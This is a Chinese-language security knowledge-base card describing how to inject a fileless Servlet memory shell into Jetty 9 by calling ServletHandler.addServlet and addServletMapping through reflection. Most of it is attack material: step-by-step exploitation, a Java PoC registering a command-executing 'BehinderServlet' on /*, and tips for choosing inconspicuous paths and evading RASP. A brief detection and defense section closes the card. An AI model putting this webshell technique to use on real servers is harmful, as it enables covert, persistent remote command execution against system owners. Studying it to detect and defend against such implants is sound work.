---
id: web-java-component-jetty9-servlethandler-servlet-memshell
title: Jetty 9 Servlet 内存马：反射调用 ServletHandler.addServlet/addServletMapping 注册 ServletHolder
type: scenario
domain: web
path: web/java/component
technique: jetty9-servlethandler-servlet-memshell
aliases:
- Jetty Servlet 内存马
- _servlets/_servletMappings
- ServletHandler.addServlet
- BehinderServlet
- Jetty 无文件 Servlet
tags:
- java
- jetty
- memshell
- servlet
- servlethandler
- reflection
- classloader
- javax-servlet
cve: []
severity: critical
confidence: high
affected_versions: Jetty 9.0.7.v20131107（原文验证版本）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:17:35+08:00'
  notes: 已对照原文与43张图核对：ServletHandler._servlets/_servletMappings（图27）、setServlets 遍历 holder.setServletHandler(this)+updateBeans+updateNameMappings+invalidateChainsCache（图28）、ServletHolder(Servlet) 构造调 setServlet（图29）、ServletMapping 的 _servletName/_pathSpecs（图30）、addServlet/addServletMapping 走 ArrayUtil.addToArray（图31）、setServletMappings 调 updateMappings/invalidateChainsCache（图32）、访问 /?cmd=whoami 执行 whoami 回显（图33/43）均与卡片一致。修正：原理中 servlet 查找的 _filterNameMap 笔误已改为 _servletNameMap（知识卡已改后 kb verify）。未验证点：未本机复跑；affected_versions 按原文 9.0.7 验证版本保留；frontmatter 无 sources/source_url。dup-scan 与 Filter 卡 likely_duplicate，经原文裁决 Filter/Servlet 注入对象与 API 完全不同（_filterPathMappings+FilterMapping vs _servlets/_servletMappings+addServlet/addServletMapping），不同机制，两卡并列保留。
---

## 一句话结论

Jetty 9 的 `ServletHandler` 用 `_servlets`（`ServletHolder[]`）和 `_servletMappings`（`ServletMapping[]`）维护 Servlet 注册；取得 ServletHandler 后，用容器类加载器反射构造 `ServletHolder`/`ServletMapping`，分别调用 `addServlet(holder)` 与 `addServletMapping(mapping)`，即可把自定义 `HttpServlet` 挂到 `/*` 或指定路径，请求即执行命令。

## 原理

- **注册表结构**：`ServletHandler._servlets` 保存所有 `ServletHolder`，`_servletMappings` 保存 `ServletMapping`（`_servletName` + `_pathSpecs`）。请求到达时，`ServletHandler` 按 mapping 的路径找到名字，再从 `_servlets`/`_servletNameMap` 找到 holder 并调用 `handle()`。
- **addServlet 的副作用**：`addServlet(ServletHolder)` 内部执行 `setServlets(ArrayUtil.addToArray(getServlets(), holder, ServletHolder.class))`；`setServlets` 会遍历数组给每个 holder 调用 `setServletHandler(this)`，再 `updateBeans`、`updateNameMappings`、`invalidateChainsCache()`。因此不需要手工改数组，调用 setter 就能让新 Servlet 进入路由。
- **addServletMapping**：`addServletMapping(ServletMapping)` 执行 `setServletMappings(ArrayUtil.addToArray(getServletMappings(), mapping, ServletMapping.class))`，随后 `updateMappings()` 并 `invalidateChainsCache()`，让新路径立即生效。
- **ServletHolder**：与 FilterHolder 类似，`ServletHolder(Servlet)` 构造器会调用 `setServlet(servlet)`；`setName` 在父类 `Holder` 上。`setServlet` 把实例写入 holder 的 `_servlet`/servlet 字段。
- **类加载器身份**：`ServletHolder`、`ServletMapping` 必须用 `servletHandler.getClass().getClassLoader()` 加载并反射实例化，否则同名类来自不同 ClassLoader，强转或反射方法匹配会失败。
- **为什么无文件**：只改运行期对象数组，不写 web.xml/JSP；重启后失效。Servlet 的 `doGet`/`service` 可直接读请求参数执行命令并回显。

## 触发条件

- 目标为 Jetty 9.x（`javax.servlet`），原文实测 9.0.7.v20131107。
- 攻击者能在目标 JVM 内执行代码或加载字节码（反序列化、表达式注入、JSP、TemplatesImpl 等）。
- 能取得 ServletHandler 实例（TCCL 链、请求对象或对象搜索）。
- 目标路径可被新 mapping 覆盖；`/*` 会抢占默认 Servlet，实战中可改用更隐蔽的具体路径。
- 未被 RASP 检测到 Servlet 列表被反射修改。

## 利用步骤

1. 取 `ServletHandler`（同 Filter 卡：TCCL `_context._servletHandler` 或请求反查）。
2. 用容器类加载器加载 `org.eclipse.jetty.servlet.ServletHolder`，反射无参构造；`setServlet(new BehinderServlet())`、`setName("BehinderServlet")`。
3. 反射调用 `ServletHandler.addServlet(holder)`；`setServlets` 会补 `_servletHandler` 并刷新缓存。
4. 用容器类加载器加载 `org.eclipse.jetty.servlet.ServletMapping`，反射无参构造；`setServletName("BehinderServlet")`、`setPathSpec("/*")`。
5. 反射调用 `ServletHandler.addServletMapping(mapping)`。
6. 访问 `/?cmd=whoami` 或指定路径，Servlet 的 `doGet` 执行命令并回显。
7. 测试后重启进程；若需清理，可从数组移除对应 holder/mapping 并 `invalidateChainsCache()`。

## PoC

```java
Object servletHandler = getServletHandler(); // TCCL -> _context -> _servletHandler
ClassLoader cl = servletHandler.getClass().getClassLoader();

Object holder = cl.loadClass("org.eclipse.jetty.servlet.ServletHolder")
        .getDeclaredConstructor().newInstance();
holder.getClass().getDeclaredMethod("setServlet", javax.servlet.Servlet.class)
        .invoke(holder, new BehinderServlet());
holder.getClass().getSuperclass().getDeclaredMethod("setName", String.class)
        .invoke(holder, "BehinderServlet");

java.lang.reflect.Method addServlet = servletHandler.getClass()
        .getDeclaredMethod("addServlet", holder.getClass());
addServlet.setAccessible(true);
addServlet.invoke(servletHandler, holder);

Object mapping = cl.loadClass("org.eclipse.jetty.servlet.ServletMapping")
        .getDeclaredConstructor().newInstance();
mapping.getClass().getDeclaredMethod("setServletName", String.class)
        .invoke(mapping, "BehinderServlet");
mapping.getClass().getDeclaredMethod("setPathSpec", String.class)
        .invoke(mapping, "/*");

java.lang.reflect.Method addMapping = servletHandler.getClass()
        .getDeclaredMethod("addServletMapping", mapping.getClass());
addMapping.setAccessible(true);
addMapping.invoke(servletHandler, mapping);
```

`BehinderServlet` 继承 `HttpServlet`，`doGet` 中取 `request.getParameter("cmd")`，执行并回显；也可在 `service` 中统一处理。

## 变体与关联

- **路径选择**：`/*` 会覆盖默认 Servlet，动静分离站点可能影响业务；可改成 `/evil`、`/static/xxx` 等不显眼路径。
- **Filter + Servlet 组合**：Filter 负责鉴权/回显，Servlet 负责执行；两者可独立注册。
- **高版本 Jetty 9.4.44+**：ServletHolder 的 `setServlet` 路径与 FilterHolder 不同，一般无需 initialize 绕过；若 holder 内部走 `setInstance`，同样可用 `initialize()` 补齐。
- **关联**：[[web-java-component-jetty9-servlethandler-filter-memshell]]（Filter 版）；[[web-java-component-jetty9-filterholder-initialize-bypass]]（FilterHolder 初始化绕过）；[[web-java-classloader-container-type-identity-memshell]]（类加载器身份）；[[web-java-component-jetty11-threadlocal-header-memshell]]（Jetty 11 无 API 方式）。

## 检测与防御

- **检测**：运行期遍历 `ServletHandler._servlets`/`_servletMappings`，对比 web.xml 与注解注册；关注 `addServlet`/`addServletMapping` 的反射调用、类名可疑或路径为 `/*` 的新 Servlet；监控 `invalidateChainsCache` 的异常调用。
- **防御**：阻断任意字节码加载入口；RASP 监控 Servlet 注册表变更；Jetty 升级并限制反射；发现后重启进程、轮换凭据。
- **边界**：内存马随进程存活；不同 Jetty 9 小版本的 `addServlet` 实现可能有差异，先确认目标 `ServletHandler` 的方法签名。
